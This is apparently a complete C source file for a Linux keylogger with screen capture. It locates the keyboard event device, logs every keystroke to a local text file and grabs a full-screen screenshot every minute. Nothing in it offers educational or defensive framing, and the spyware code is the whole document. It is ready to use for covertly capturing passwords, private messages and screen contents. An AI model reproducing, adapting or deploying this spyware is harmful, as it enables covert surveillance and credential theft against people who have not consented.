#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <time.h>

#define LOGFILEPATH "./keylogger.txt"

// Extended key map for common keys, numbers, and symbols
char* keymap[] = {
    "", "[ESC]", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "[BACKSPACE]",
    "[TAB]", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "[ENTER]",
    "[CTRL]", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "[LSHIFT]",
    "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "[RSHIFT]",
    "*", "[ALT]", " ", "[CAPSLOCK]", // 42 to 58
    "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]",
    "[NUMLOCK]", "[SCROLLLOCK]", "7", "8", "9", "-", "4", "5", "6", "+",
    "1", "2", "3", "0", ".", // Numeric keypad
    "", "", "", "[F11]", "[F12]", "", "", "", "", "", // 70 to 79
    "", "", "", "", "", "", "", "", "", "[HOME]", "[UP]", "[PGUP]", "[LEFT]", "[RIGHT]", "[END]",
    "[DOWN]", "[PGDN]", "[INSERT]", "[DELETE]", // Arrow keys, etc.
    "", "", "", "", "", "", "", "", "", "", // 90 to 99
    "[LWIN]", "[RWIN]", "[MENU]", "" // Windows keys
    // Extend as needed for additional keys
};

char *getEvent();
void takeScreenshot(int screenshot_count);

int main() {
    struct input_event ev;
    static char path_keyboard[20] = "/dev/input/";
    strcat(path_keyboard, getEvent());
    path_keyboard[strlen(path_keyboard) - 1] = 0;

    int device_keyboard = open(path_keyboard, O_RDONLY);
    if (device_keyboard < 0){
        printf("Error: %d\n", errno);
        exit(1);
    }

    FILE *fp = fopen(LOGFILEPATH, "a");
    if (fp == NULL) {
        printf("Error opening log file.\n");
        exit(1);
    }

    time_t last_screenshot_time = time(NULL);
    int screenshot_count = 0;

    while (1) {
        read(device_keyboard, &ev, sizeof(ev));

        if (ev.type == EV_KEY && ev.value == 0) { // Key release event
            if (ev.code < sizeof(keymap) / sizeof(keymap[0])) {
                fprintf(fp, "%s", keymap[ev.code]);
                fflush(fp);
            }
        }

        time_t current_time = time(NULL);
        if (current_time - last_screenshot_time >= 60) {
            takeScreenshot(screenshot_count++);
            last_screenshot_time = current_time;
        }
    }

    fclose(fp);
    close(device_keyboard);
}

char *getEvent(){
    char *command = "cat /proc/bus/input/devices | grep -C 4 keyboard | grep -E -o 'event[0-9]'";
    static char event[8];
    FILE *pipe = popen(command, "r");
    if (!pipe)
        exit(1);
    fgets(event, 8, pipe);
    pclose(pipe);
    return event;
}

void takeScreenshot(int screenshot_count) {
    char screenshot_filename[100];
    sprintf(screenshot_filename, "./screenshot_%d.png", screenshot_count);
    char command[200];
    sprintf(command, "import -window root %s", screenshot_filename);
    system(command);
}